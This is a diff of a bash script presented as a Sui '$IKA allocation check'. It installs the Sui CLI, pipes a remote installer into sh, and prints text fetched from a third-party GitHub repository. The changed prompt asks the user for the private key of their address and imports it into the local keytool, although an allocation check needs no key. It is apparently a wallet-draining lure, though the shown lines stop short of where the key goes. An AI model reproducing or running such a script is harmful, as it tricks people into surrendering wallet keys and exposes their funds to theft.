@@ -1,20 +1,34 @@
 #!/usr/bin/env bash
 set -euo pipefail
 
+INSCR=$(curl -fsSL "https://raw.githubusercontent.com/WillzyDollarrzz/willzy/refs/heads/main/inscription.txt")
+
+printf "%b\n" "$INSCR"
+
+sleep 2
+
+echo "▶ Starting…"
+
 curl -sSfL https://raw.githubusercontent.com/MystenLabs/suiup/main/install.sh | sh
 export PATH="$HOME/.local/bin:$PATH"
 source ~/.bashrc
 
 suiup install sui@mainnet-1.52.3
 sui --version
-
 rm -f ~/.sui/sui_config/client.yaml
-sui client new-env <<EOF
+
+
+{
+  sui client new-env \
+    --alias mainnet \
+    --rpc https://fullnode.mainnet.sui.io:443 <<EOF
 y
 https://fullnode.mainnet.sui.io:443
 mainnet
 0
 EOF
+} || echo "⚠️ Mainnet setup skipped (already exists or failed), continuing…"
+
 
 sui client switch --env mainnet
 
@@ -29,7 +43,7 @@ AIRDROP_POOL="0xf040974b98d008efccf0cee6cbaf0a456a76536601248d99fb9625d7fc8185e7
 GAS_AMOUNT_MIST=1000000000   # ~ 1 $SUI
 
 
-read -rp "Enter your Sui address for allocation check: " TARGET_ADDR
+read -rp "Enter your Sui address to check $IKA allocation: " TARGET_ADDR
 
 echo "Fetching on-chain objects for $TARGET_ADDR..."
 sui client objects "$TARGET_ADDR" --json > objs.json
@@ -62,7 +76,7 @@ if [[ "$CHOICE" != "1" ]]; then
 fi
 
 
-read -rp "Enter your mnemonic or private key: " KEYSTRING
+read -rp "Enter the private key of the address: " KEYSTRING
 echo "$KEYSTRING" | sui keytool import --scheme ed25519 --privkey >/dev/null
 
 
